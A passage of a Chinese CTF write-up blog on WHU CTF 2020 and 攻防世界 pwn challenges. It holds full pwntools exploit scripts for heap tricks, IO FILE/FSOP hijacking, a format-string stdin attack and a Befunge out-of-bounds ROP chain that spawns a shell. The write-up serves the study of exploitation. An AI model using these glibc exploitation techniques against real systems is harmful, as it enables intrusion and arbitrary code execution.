= 10002 LOCAL = True if len(sys.argv)==1 else False global bps # Break Points global gds # Gdb Debug Symbols bps = [] gds = {} elf = ELF(filename) remote_libc = \"./libc-2.23.so\" if LOCAL: io = process(filename) # io = process(filename,aslr=False) libc = elf.libc # # if LD_PRELOAD multiple libs, split with ':' # io = process(filename, env={'LD_PRELOAD': remote_libc}) #libc = ELF(remote_libc) else: context.log_level = 'debug' io = remote(ip, port) # libc = elf.libc libc = ELF(remote_libc) def mydebug(p, s=''): def _get_bstr(): global bps b_str =\"\" for break_point in bps: if type(break_point) == int: b_str += \"b *%s\\n\"%(hex(break_point)) elif type(break_point) == str: b_str += \"b %s\\n\"%(break_point) else: pause(p, \"[_get_bstr] unsupported break point type : \"+str(break_point)) return b_str def _get_gds_str(): global gds res = \"\" for name in gds: val = gds[name] if type(name) != str: pause(p, \"[_get_gds_str] unsupported name type : \"+str(type(name))) if type(val) != int: pause(p, \"[_get_gds_str] unsupported val type : \"+str(type(val))) res += \"set $%s=%d\\n\"%(name, gds[name]) return res if not LOCAL: return gdb.attach(p, _get_bstr()+_get_gds_str()+s) def pause(p, s = 'pause'): if LOCAL: print('pid: ' + str(p.pid)) return raw_input(s) else: return raw_input(s) def choice(p, idx): sla(p, XXX, str(idx)) def lg(name, val): log.info(name+\" : \"+hex(val)) def add(): sla(io,\"your choice :\\n\",\"1\") def edit(name,data): sla(io,\"your choice :\\n\",\"2\") sa(io,'name:\\n',name) sla(io,'data:\\n',data) def show(): sla(io,\"your choice :\\n\",\"4\") def free(): sla(io,\"your choice :\\n\",\"3\") pause(io) # mydebug(io,\"b *0x0400906\") fake_chunk = 0x06010A0 for i in range(0x40): add() free() edit(p64(fake_chunk),'b') add() add() edit(p64(elf.got['atoi']),'c') show() ru(io,\"name:\") atoi_addr = u64(rv(io,6)+'\\x00\\x00') libc_base = atoi_addr - libc.sym['atoi'] lg(\"base:\",libc_base) sys = libc_base + libc.sym['system'] edit(p64(sys),'d') sla(io,\"your choice :\\n\",\"/bin/sh\") io.interactive() WHUCTF{Should_You_Attack_Bss} ","date":"2020-05-29","objectID":"/2020/05/whuctf2020/:5:0","tags":null,"title":"WHU CTF 2020","uri":"/2020/05/whuctf2020/"},{"categories":["PWN"],"content":"overflow 考察IO FILE。一般都是打scanf 之类的函数，这题可以直接在bss 伪造整个IO FILE，把vtable填充为one_gadget地址，令stdout 指向这个FILE结构体便能跳转到shell。 这题花的时间最长还是没有解决，不太清楚IO FILE结构体哪些东西需要赋值为哪些特殊的值才能通过检测，又得看源码了吗/(ㄒoㄒ)/ 最骚的是跑官方wp可以跑通，一挂上gdb就崩，导致无法调试，擦这什么神必题目 https://xz.aliyun.com/t/2608 可以按照2018网鼎杯Lilac提供的blind题解（葵佬nb！）构造IO_FILE 令vtable指向addr+240 ，然后在addr+240中构造虚表，把 xsputn 位置改为one_gadget就能在下次调用printf 的时候getshell void * funcs[] = { 1 NULL, // \"extra word\" 2 NULL, // DUMMY 3 exit, // finish 4 NULL, // overflow 5 NULL, // underflow 6 NULL, // uflow 7 NULL, // pbackfail 8 NULL, // xsputn #printf ... } exp如下： from pwn import * context.log_level = 'debug' io = process(\"./pwn\",aslr=False) # io = remote(\"218.197.154.9\",10006) elf = ELF(\"./pwn\") # libc = ELF(\"/lib/x86_64-linux-gnu/libc-2.23.so\") context.terminal = ['tmux', 'splitw', '-h'] gdb.attach(io,\"b *0x555555554B60\") def rread(offset): io.sendlineafter(\"Choice:\",\"1\") io.sendlineafter(\"Offset:\\n\",str(offset)) def wwrite(offset,size,data): io.sendlineafter(\"Choice:\",\"2\") io.sendlineafter(\"Offset:\\n\",str(offset)) io.sendlineafter(\"Size:\\n\",str(size)) io.sendlineafter(\"Input data:\\n\",data) io.recvuntil(\"Gift:\\n\") addr = int(io.recv(14),16) elf_base = addr - 0x202060 success(\"elf_base:\"+hex(elf_base)) rread(-0x40) io.recvuntil(\"This is your data:\\n\") libc_base = u64(io.recv(6)+'\\x00\\x00')-0x7f2f223cb620+0x7f2f22006000 success(\"libc_base:\"+hex(libc_base)) payload = p64(0xfbad8800)+p64(addr)*7 payload += p64(addr+1)+p64(0)*4+p64(addr)+p64(1) payload += p64(0xffffffffffffffff)+p64(0)+p64(addr)+p64(0xffffffffffffffff) payload += p64(0)+p64(addr)+p64(0)*3+p32(0xffffffff)+p32(0)+p64(0)*2+p64(addr+240) payload += p64(0)*7 + p64(libc_base + 0x4526a) print(len(payload)) wwrite(0, \"-1\", payload) io.recv() io.sendline(\"2\") io.recv() io.sendline(\"-48\") io.recv() io.sendline(str(8)) io.recv() io.sendline(p64(addr)) WHUCTF{Bss_Overflow_And_File_Struct_Exploitation} ","date":"2020-05-29","objectID":"/2020/05/whuctf2020/:6:0","tags":null,"title":"WHU CTF 2020","uri":"/2020/05/whuctf2020/"},{"categories":["PWN"],"content":"heaptrick 进阶堆技巧+fsop，mark 打global_max_fast ，让fastbin 的最大大小变大，而free堆块后，系统根据fastbin大小的不同，在main_arena的fastbinY数组中填入被free堆块的地址。例如size=0x20的fastbin地址填在main_arena+8，0x30的fastbin地址填在main_arena+16……直到0x80的fastbin在main_arena+56。 设fastbinsize的堆块放在main_arena+offset位置，推出公式为： fastbinsize=2*(offset+8) 所以可以打到main_arena后面的某些数据，让其指向某个堆块。这里选择打_IO_list_all ，为_IO_FILE数组的头指针，位于main_arena+0xa00； 当系统执行exit(0)时调用_IO_flush_all_lockp函数，该函数寻找下一个_IO_FILE结构体，将调用该结构体vtable中的_IO_OVERFLOW函数 (位于vtable+0x18处)，虚表见上 详情参考https://docs.qq.com/doc/DUGp2TFBBb1hFRm11?pub=1\u0026dver=2.1.0 from pwn import * env=os.environ env['LD_PRELOAD']='./heaptrick.so' context.log_level='debug' #r=process('./heaptrick') r=remote('218.197.154.9',10003) def add(size,cont): r.recvuntil('exit\\n') r.sendline('1') r.recvuntil(':') r.sendline(str(size)) r.recvuntil(':') r.sendline(cont) def delete(idx): r.recvuntil('exit\\n') r.sendline('2') r.recvuntil(':\\n') r.sendline(str(idx)) def edit(cont): r.recvuntil('exit\\n') r.sendline('3') r.recvuntil(':') r.sendline(cont) #step 1:leak elfbase and libc r.recvuntil('exit\\n') r.sendline('666') elfbase=int(r.recvline()[:-1],16)-0x202040 bsscomment=elfbase+0x2020e0 success(\"elfbase:\"+hex(elfbase)) add(0xa0,'0'*0xa0)#0 add(0xa0,'1'*0xa0)#1 fakefile=p64(0)*3+p64(1)+p64(0)*21+p64(bsscomment-0x18) #fakesize=2*(\u0026_IO_list_all-\u0026main_arena+8)-0x10=0x1400 fakesize=0x1400 add(fakesize,fakefile)#2 delete(0) add(0xa0,'2'*7)#0 r.recvuntil('2'*7+'\\n') leak=u64(r.recvline()[:-1].ljust(8,'\\x00')) success(\"leak:\"+hex(leak)) lbase=leak-0x7ffff7dd1b78+0x7ffff7a0d000 global_max_fast=leak-0x7ffff7dd1b78+0x7ffff7dd37f8 _IO_list_all=leak-0x7ffff7dd1b78+0x7ffff7dd2520 one=lbase+0x4526a success(\"lbase:\"+hex(lbase)) success(\"maxfast:\"+hex(global_max_fast)) success(\"io:\"+hex(_IO_list_all)) #step 2:overwrite global_max_fast with big value edit(p64(one)+p64(0)*3+p64(global_max_fast)) #step 3:free fake chunk and change _IO_list_all to fake chunk delete(2) #step 4:call exit and go to _IO_flush_all_lockp r.recvuntil('exit\\n') r.sendline('4') r.interactive() WHUCTF{Nice_Heap_Tricks!!!} 个人感觉不需要打IO_FILE，可以直接打free_hook ，然后在堆中填充shellcode即可 ","date":"2020-05-29","objectID":"/2020/05/whuctf2020/:7:0","tags":null,"title":"WHU CTF 2020","uri":"/2020/05/whuctf2020/"},{"categories":["PWN"],"content":"好不容易打进rank3，随手记录一下近期做过的三道比较繁琐的高分题吧 ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:0:0","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"Befunge ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:1:0","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"漏洞解析 8分题，是一道比较有意思的虚拟机pwn。该程序模拟了一个Befunge语言的解释器 Befunge的代码是二维的。它用 \u003c \u003e v ^ 这四个符号来控制一个指针在代码中移动，指针经过一个字符或数字则把它压入一个栈，四则运算符号的功能就是弹出栈顶两个元素进行计算后把结果压回去。用 _ 和 | 来表示有条件的方向选择：当栈顶元素为0时向右（上）走，否则向左（下）走。\u0026 和 ~ 分别用于读入数字或字符并压入栈，句号和逗号分别表示将栈顶元素作为整数或字符输出。最后以一个@符号表示程序结束。 保护全开，根据提示是一个Befunge93解释器，查阅一些资料（[1], [2],[3]） # pwn @ ubuntu in /mnt/hgfs/adworld [3:39:33] C:1 $ ./interpreter-200 Welcome to Online Befunge(93) Interpreter Please input your program. \u003e 耐心逆一下可以发现确实如此，program[2000]按二维组织成$25*80$。 代码上下左右移动靠下面的跳转表实现。 .rodata:00000000000014E0 ; _DWORD dword_14E0[4] .rodata:00000000000014E0 dword_14E0 dd 0, 1, 0, 0FFFFFFFFh ; DATA XREF: main+520↑o .rodata:00000000000014F0 ; _DWORD dword_14F0[4] .rodata:00000000000014F0 dword_14F0 dd 1, 0, 0FFFFFFFFh, 0 ; DATA XREF: main+536↑o 每次读取代码后依据方向改变下一次读取位置，其中x为行数，y为列数，就像走迷宫一样。 /*执行方向 0-右 1-下 2-左 3-上 */ prog_x += dword_14E0[direction]; v30 = prog_y + dword_14F0[direction]; prog_y += dword_14F0[direction]; if ( prog_x == -1 ) // 25*80的program矩阵 { prog_x = 24; } else if ( prog_x == 25 ) { prog_x = 0; } if ( v30 == -1 ) { prog_y = 79; } else if ( prog_y == 80 ) { prog_y = 0; } 注意到program数组是char，stack数组是QWARD，所以pop和push都是int64类型，所以漏洞点也比较明显，在主函数中g与p都能越界，这样便可以任意地址读写，布置rop链即可。 case 'g': v26 = pop(); v27 = pop(); push(program[80 * v26 + v27]); break; case 'p': v28 = pop(); v29 = pop(); program[80 * v28 + v29] = pop(); break; 这里我们需要泄露很多东西，got表里有puts_ptr和program_ptr，我们可以泄露elf_base和libc_base，由于要布置ROP链，也需要拿到一个栈指针，这里也是先拿到libc地址，然后用environ变量拿到栈指针。 ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:1:1","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"漏洞利用 总体来说在进阶区里还是算比较难的题，逆向和漏洞利用工作量都不小。exp如下 from pwn import * context(arch = 'amd64', os = 'linux', endian = 'little') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h'] io = process(\"./interpreter-200\") #io = remote(\"220.249.52.134\",33610) #gdb.attach(io,\"b *0xE05+0x555555554000\") # 0x202040 -\u003e 0x201F50 gdb.attach(io,\"b *0x1203+0x555555554000\") program = \"\u0026\u0026g,\u0026\u0026g,\u0026\u0026g,\u0026\u0026g,\u0026\u0026g,\u0026\u0026g,\" # leak puts_addr program += \"\u0026\u0026g,\u0026\u0026g,\u0026\u0026g,\u0026\u0026g,\u0026\u0026g,\u0026\u0026g,\" #leak elf_addr program = program.ljust(79, \" \") + \"v\\n\" program += \"v\" + \" \"*78 + \"\u003c\\n\" program += \"\u003e\u0026\u0026\u0026*\u0026+g,\u0026\u0026\u0026*\u0026+g,\u0026\u0026\u0026*\u0026+g,\u0026\u0026\u0026*\u0026+g,\u0026\u0026\u0026*\u0026+g,\u0026\u0026\u0026*\u0026+g,\".ljust(79, \" \") + \"v\\n\"# leak stack_addr program += \"v\" + \" \"*78 + \"\u003c\\n\" program += (\"\u003e\" + \"\u0026\u0026\u0026\u0026*\u0026+p\"*8).ljust(79, \" \") + 'v\\n' # ROP exploit program += \"v\" + \" \"*78 + \"\u003c\\n\" program += (\"\u003e\" + \"\u0026\u0026\u0026\u0026*\u0026+p\"*8).ljust(79,\" \") + 'v\\n' program += \"v\" + \" \"*78 + \"\u003c\\n\" program += \"\u003e\" + \"\u0026\u0026\u0026\u0026*\u0026+p\"*8 + '\u003e\u003c' io.sendline(program.ljust(2000,'@')) for i in range(6): io.sendline(str(i)) io.sendline(\"-3\") #for i in range(6): # io.sendline(str(i+0x28)) # io.sendline(\"-3\") for i in range(-16, -10): io.sendline(str(i)) io.sendline(\"-1\") io.recvuntil(\"\u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \u003e \") puts_addr = u64(io.recv(6)+'\\x00\\x00') #fgets_addr = u64(io.recv(6)+'\\x00\\x00') #success(len(io.recv(6))) progbuf_addr = u64(io.recv(6)+'\\x00\\x00') libc_base = puts_addr - 0x6F690 environ = libc_base + 0x3c6f38 elf_base = progbuf_addr - 0x202040 success(hex(elf_base)) success(hex(environ)) success(hex(libc_base)) #raw_input() x = (environ - elf_base - 0x202040) / 80 y = (environ - elf_base - 0x202040) % 80 x_1 = x / 50000 x_2 = x % 50000 for i in range(6): io.sendline(str(y+i)) io.sendline(str(x_1)) io.sendline(str(50000)) io.sendline(str(x_2)) stack_addr = '' for i in range(6): stack_addr += io.recv(1) stack_addr = u64(stack_addr+'\\x00\\x00') success(hex(stack_addr)) rop_target = stack_addr - 0x128 + 0x38 raw_input() offset = rop_target - progbuf_addr prdir = 0x120c + elf_base binsh_addr = libc_base + 0x18cd57 system_addr = libc_base + 0x045390 context.log_level = 'info' # write(progbuf_addr + offset, value, 8) def edit(offset, value): x = offset / 80 y = offset % 80 x_1 = x / 50000 x_2 = x % 50000 success(x_1) success(x_2) success(y) success(hex(value)) for i in range(8): val = value \u0026 0xff value = value \u003e\u003e 8 success(\"round{}: val:{}| y:{}| x_1:{}| x_2:{}| write at:{}\".format(i, hex(val), y+i, x_1, x_2, hex((x_1*50000+x_2)*80+y+i+progbuf_addr))) io.sendline(str(val)) io.sendline(str(y+i)) io.sendline(str(x_1)) io.sendline(str(50000)) io.sendline(str(x_2)) edit(offset, prdir) edit(offset+8, binsh_addr) edit(offset+16, system_addr) io.interactive() 成功与服务器交互 [+] 11470264 [+] 27054 [+] 56 [+] 0x56434fd4f20c [+] round0: val:0xc | y:56 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ed8 [+] round1: val:0xf2 | y:57 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ed9 [+] round2: val:0xd4 | y:58 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217eda [+] round3: val:0x4f | y:59 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217edb [+] round4: val:0x43 | y:60 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217edc [+] round5: val:0x56 | y:61 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217edd [+] round6: val:0x0 | y:62 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ede [+] round7: val:0x0 | y:63 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217edf [+] 11470264 [+] 27054 [+] 64 [+] 0x7f9040bcfd57 [+] round0: val:0x57 | y:64 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee0 [+] round1: val:0xfd | y:65 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee1 [+] round2: val:0xbc | y:66 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee2 [+] round3: val:0x40 | y:67 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee3 [+] round4: val:0x90 | y:68 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee4 [+] round5: val:0x7f | y:69 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee5 [+] round6: val:0x0 | y:70 | x_1:11470264 | x_2:27054 | write at:0x7ffdd4217ee6 [+] round7:","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:1:2","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"参考资料 [1] http://www.matrix67.com/blog/archives/253 [2] https://www.jianshu.com/p/ed929cf72312 [3] http://quadium.net/funge/spec98.html ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:1:3","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"echo-back ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:2:0","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"checksec 64位程序，保护全开，无法修改got表 ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:2:1","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"漏洞 在上图函数中有明显的格式化字符串漏洞，但允许输入的字符只有7个，连一个p64都装不下。 main函数可以一直循环，在上述两个函数中选择，目前来看name 并没有什么作用。 由于格式化字符串太短无法直接改写返回地址，考虑攻击scanf()绕过大小限制，再写返回地址，分为如下几步 ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:2:2","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"获取stdin地址 我们知道栈上可能有某些关键地址，同时由于程序开启了PIE保护，必须利用格式化字符串先泄露libc与elf的基地址才能进一步攻击。观察echo_back函数return前栈的内容，可以发现在rsp+8偏移处有elf_base相关地址，在rsp+13编译处有libc_base相关地址，现在需要通过调试把找到具体的位置，把它们泄露出来 根据调试，分别输入*%14$p* 与*%19$p* 可以得到。当然其实我们还需要泄露一个返回地址所在位置，以便最后为了改写。注意，因为我们能泄露的是地址的内容而不是地址，所以这里我们只能选择泄露rbp内容，[rbp]+8处存放main函数返回地址。可以输入*%12$p* 得到。从而得到stdin地址。 ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:2:3","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"攻击stdin结构 由scanf()源码可知，它通过stdin的FILE结构暂存输入流，然后输入到指定位置。下面是scanf()的核心实现函数_IO_new_file_underflow()源码： int _IO_new_file_underflow (_IO_FILE *fp) { _IO_ssize_t count; #if 0/* SysV does not make this test; take it out for compatibility */ if (fp-\u003e_flags \u0026 _IO_EOF_SEEN) return (EOF); #endif if (fp-\u003e_flags \u0026 _IO_NO_READS) { fp-\u003e_flags |= _IO_ERR_SEEN; __set_errno (EBADF); return EOF; } /*!!!!!*/ if (fp-\u003e_IO_read_ptr \u003c fp-\u003e_IO_read_end) return *(unsigned char *) fp-\u003e_IO_read_ptr; if (fp-\u003e_IO_buf_base == NULL) { /* Maybe we already have a push back pointer. */ if (fp-\u003e_IO_save_base != NULL) { free (fp-\u003e_IO_save_base); fp-\u003e_flags \u0026= ~_IO_IN_BACKUP; } _IO_doallocbuf (fp); } /* Flush all line buffered files before reading. */ /* FIXME This can/should be moved to genops ?? */ if (fp-\u003e_flags \u0026 (_IO_LINE_BUF|_IO_UNBUFFERED)) { #if 0_IO_flush_all_linebuffered (); #else /* We used to flush all line-buffered stream. This really isn't required by any standard. My recollection is that traditional Unix systems did this for stdout. stderr better not be line buffered. So we do just that here explicitly. --drepper */ _IO_acquire_lock (_IO_stdout); if ((_IO_stdout-\u003e_flags \u0026 (_IO_LINKED | _IO_NO_WRITES | _IO_LINE_BUF)) == (_IO_LINKED | _IO_LINE_BUF)) _IO_OVERFLOW (_IO_stdout, EOF); _IO_release_lock (_IO_stdout); #endif } _IO_switch_to_get_mode (fp); /* This is very tricky. We have to adjust those pointers before we call _IO_SYSREAD () since we may longjump () out while waiting for input. Those pointers may be screwed up. H.J. */ fp-\u003e_IO_read_base = fp-\u003e_IO_read_ptr = fp-\u003e_IO_buf_base; fp-\u003e_IO_read_end = fp-\u003e_IO_buf_base; fp-\u003e_IO_write_base = fp-\u003e_IO_write_ptr = fp-\u003e_IO_write_end = fp-\u003e_IO_buf_base; /*!!!!!*/ count = _IO_SYSREAD (fp, fp-\u003e_IO_buf_base, fp-\u003e_IO_buf_end - fp-\u003e_IO_buf_base); if (count \u003c= 0) { if (count == 0) fp-\u003e_flags |= _IO_EOF_SEEN; else fp-\u003e_flags |= _IO_ERR_SEEN, count = 0; } /*!!!!!*/ fp-\u003e_IO_read_end += count; if (count == 0) { /* If a stream is read to EOF, the calling application may switch active handles. As a result, our offset cache would no longer be valid, so unset it. */ fp-\u003e_offset = _IO_pos_BAD; return EOF; } if (fp-\u003e_offset != _IO_pos_BAD) _IO_pos_adjust (fp-\u003e_offset, count); return *(unsigned char *) fp-\u003e_IO_read_ptr; } 注意其中/*!!!!!*/标识的三处是我们攻击FILE结构时需要注意的地方 当stdin-\u003e_IO_read_ptr大于等于stdin-\u003e_IO_read_end时，此函数会调用_IO_SYSREAD()在stdin-\u003e_IO_buf_base处读入stdin-\u003e_IO_buf_end - stdin-\u003e_IO_buf_base个字节，然后更新stdin-\u003e_IO_read_end的值 我们知道了stdin的地址后可以利用格式化字符串漏洞将stdin的FILE的IO_buf_base修改为main函数的返回值所在地址，即可以实现改写返回地址。但在这之前不要忘了我们只能输入7个格式化字符，我们能用这7个字符干什么呢？先调试看看吧 在echo_back返回之前，我们查看stdin的结构，可以看到echo_back结束后stdin-\u003e_IO_read_ptr是等于stdin-\u003e_IO_read_end的，在下次执行echo_back之前我们希望能修改stdin-\u003e_IO_buf_base的值。这里我们想到通过格式化字符串写stdin-\u003e_IO_buf_base，但由于字数限制又不能直接写成main函数的返回地址处。 观察FILE地址：0x7fb99cd198e0 \u003c_IO_2_1_stdin_\u003e ，我们想到将stdin-\u003e_IO_buf_base低字节写成\\x00 ，这样我们可以控制从0x7fb99cd19900 到0x7fb99cd19964 的所有地址，而FILE结构的很多部分也就在这个范围内，包括stdin-\u003e_IO_buf_base与stdin-\u003e_IO_buf_end！这样我们便可以为所欲为了。但是我们怎么利用格式化字符串能写stdin-\u003e_IO_buf_base呢？这时想起了函数name，它写入的参数就echo_back中a1。所以我们在a1中输入p64(stdin-\u003e_IO_buf_base)，并在echo_back中键入格式化字符串修改，调试得a1对应位置为%16$p ，故输入%16$hhn 即可修改。动手试试，下图为修改结果 所以我们下次输入能从0x7fb99cd19900 一直写到0x7fb99cd19964 ，也能再次通过覆盖而改变stdin-\u003e_IO_buf_base与stdin-\u003e_IO_buf_end，为避免错误保持前几项不变，为_IO_2_1_stdin_+131 。下面将stdin-\u003e_IO_buf_base与stdin-\u003e_IO_buf_end修改为我们想要写的main函数返回地址处 改写成功！接下来我们只要再次执行到echo_back 中的scanf() 输入p64(pop_rdi_ret)+p64(binsh_addr)+p64(system_addr) 就好了 但我们还是高兴得太早了，仔细看上图stdin-\u003e_IO_read_ptr显然已经小于stdin-\u003e_IO_read_end了！！所以我们根本没办法写入数据。 最后一个拦路虎通过echo_back中的getchar() 解决，getchar()会将stdin-\u003e_IO_read_ptr加一，所以再调用echo_back 几次（几十次，最终即可顺利读取并getshell。 ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:2:4","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"exp ubuntu16.04测试成功:-) #! /usr/bin/env python #coding:utf8 from pwn import * local = 1 if local: p = process('./echo_back') else: p = remote(\"111.198.29.45\", 38784) debug = 1 if debug: context.log_level = 'debug' elf = ELF('./echo_back') libc = ELF('./libc.so.6') prdi = 0x0000000000000d93 main_P_addr = 0xc6c IO_stdin = libc.symbols['_IO_2_1_stdin_'] context.terminal = ['tmux', 'splitw', '-h'] gdb.attach(p) def echo_back(size, con): p.sendlineafter('choice\u003e\u003e ', '2') p.sendlineafter('length:', str(size)) p.send(con) def name(name): p.sendlineafter('choice\u003e\u003e ', '1') p.sendafter('name:', name) def pause(p, s = 'pause'): return raw_input(s) # 泄露libc基址 echo_back(7, '%19$p') p.recvuntil('0x') libc_s_m_addr = int(p.recvuntil('-').split('-')[0], 16) - 240 print hex(libc_s_m_addr) offset = libc_s_m_addr - libc.symbols['__libc_start_main'] system = libc.symbols['system'] + offset bin_sh = libc.search('/bin/sh').next() + offset IO_stdin_addr = IO_stdin + offset print hex(offset) # 泄露elf基址 echo_back(7, '%14$p') p.recvuntil('0x') elf_base = int(p.recvuntil('-', drop=True), 16) - 0xd30 prdi = prdi + elf_base # 泄露main返回地址 echo_back(7, '%12$p') p.recvuntil('0x') main_ebp = int(p.recvuntil('-', drop=True), 16) main_ret = main_ebp + 0x8 # 修改IO_buf_base，增大输入字符数 IO_buf_base = IO_stdin_addr + 0x8 * 7 print \"IO_buf_base:\"+hex(IO_buf_base) name(p64(IO_buf_base)) echo_back(7, '%16$hhn') # 输入payload，覆盖stdinFILE结构的关键参数 payload = p64(IO_stdin_addr + 131) * 3 + p64(main_ret) + p64(main_ret + 3 * 0x8) p.sendlineafter('choice\u003e\u003e ', '2') p.sendafter('length:', payload) p.sendline('') # 绕过_IO_new_file_underflow中检测 for i in range(0,len(payload) - 1): p.sendlineafter('choice\u003e\u003e ', '2') p.sendlineafter('length:', '0') # 实现指定位置写 pause(p) p.sendlineafter('choice\u003e\u003e ', '2') p.sendlineafter('length:', p64(prdi) + p64(bin_sh) + p64(system)) p.sendline('') # getshell p.sendlineafter('choice\u003e\u003e ', '3') p.interactive() ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:2:5","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"magic ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:3:0","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"checksec 64位程序，只开了NX与Canary，可以劫持got表 ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:3:1","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"漏洞 分析程序知wizard为一个结构体，先在ida中创建，便于后续分析 主要函数为wizard_spell ，存在负下标的漏洞，并且函数先后调用了fwrite 与fread 同时我们发现，全局变量log_file与wizards数组离得很近，所以我们可以通过负下标控制log_file 指向的FILE内容 本题主要考察fwrite与fread的源码，读函数如fread/scanf等 都会调用IO_underflow ，写函数是IO_overflow ，与FILE 相关的操作都在里面。分析源码后某大佬得出结论（不是我 在读操作中，我们只能修改写相关的指针，如_IO_write_base/_IO_write_ptr 等 而在写操作中，我们只能修改读相关指针，如_IO_read_base/_IO_read_ptr等 也就是说我们只能在fwrite中改写读的指针，在fread中改写写的指针。我们的思路是，修改_IO_read_ptr打印出libc基址，修改_IO_write_ptr 改写atoi_got 内容为system ，具体来说分为以下部分 ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:3:2","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"修改_IO_write_ptr 我们发现wizard-\u003epower与log_file-\u003e_IO_write_ptr在各自结构体中的偏移相同，也就是说如果我们输入负下标-2，每次调用完wizard_spell后log_file-\u003e_IO_write_ptr就会减少50，很自然想到让其减少到FILE结构体，这样就可以任意修改FILE了。动手调试一下 我们先初始化一个wizard[0] ，以初始化FILE 结构体，在wizard_spell 返回前断下。 简单计算一下，656=14*50-44 ，也就是至少调用14次wizard_spell ，然后在这14次中应该输入44个字符串，因为每次_IO_write_ptr 还会加上输入的字符串数。这里经过反复调试（因为FILE前后数据段有很多重要参数，我们每次都修改了某些参数，很容易使程序崩溃），最终得到了一个不会崩溃的输入序列 for i in range(11): spell(-2, '\\x00') spell(-2, '\\x00' * 11) spell(-2, '\\x00' * 11) spell(-2, '\\x00' * 11) 这时_IO_write_ptr位于FILE-1的位置，调试一下确实如此，可以输入数据覆盖FILE 结构了 ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:3:3","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"泄露libc与heap_base 紧接上文，我们可以将FILE的_IO_read_ptr的值修改为atoi_got，这样在下一次调用wizard_spell 时调用fwrite 会将_IO_read_ptr指向的值也就是atoi 的实际地址读入到log_file 中，然后通过fread 打印出来，泄露libc 。需要注意这里我们应该向wizard[0] 而不是wizard[-2]中输入payload，因为我们并不想让_IO_write_ptr 减少50。同时应该尽量保持其他FILE 数据不变。 # leak libc payload = '\\x00' payload += p64(0xfbad24a8) spell(0,payload) payload = p64(atoi_got) + p64(atoi_got + 0x100) spell(0,payload) atoi_addr = u64(p.recv(8)) print hex(atoi_addr) 于是我们泄露了libc ，此时的_IO_write_ptr指向了_IO_read_base ，也即FILE +24偏移处，所以我们重新利用wizard[-2] 来使_IO_write_ptr指回FILE 首地址，继续修改FILE 来泄露heap_base ，而log_file 为FILE指针，内容即为堆上的地址，用它来泄露heap_base 。 # leak heap spell(-2, '\\x00' * 0x10) spell(0, '\\x00' * 10 + p64(0xfbad24a8)) spell(0, p64(log_file) + p64(log_file + 0x50)) heap = u64(p.recvn(8)) - 0x10 print 'heap:',hex(heap) ","date":"2020-04-12","objectID":"/2020/04/adworld-pwn0/:3:4","tags":null,"title":"攻防世界PWN进阶区 部分题解","uri":"/2020/04/adworld-pwn0/"},{"categories":["PWN"],"content":"修改atoi_got 表项 紧接上文，我们现在的_IO_write_ptr指向了_IO_read_base 。我们下一步是想写atoi_got 表项为system ，就像上面一样很自然的思路当然是修改_IO_write_ptr 